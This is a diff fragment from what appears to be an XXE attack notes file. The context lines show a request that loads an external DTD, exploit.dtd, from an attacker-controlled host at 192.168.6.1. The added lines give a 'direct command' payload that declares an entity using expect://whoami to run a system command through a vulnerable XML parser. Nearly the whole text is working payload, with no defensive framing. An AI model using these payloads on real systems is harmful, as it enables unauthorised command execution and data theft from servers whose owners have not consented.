@@ -19,3 +19,10 @@ Local payload called: exploit.dtd:
 
 Request:  
 <!DOCTYPE load SYSTEM "http://192.168.6.1/exploit.dtd">
+---
+direct command:
+
+<!DOCTYPE email [
+<!ENTITY cmd SYSTEM "expect://whoami" >
+]>
+
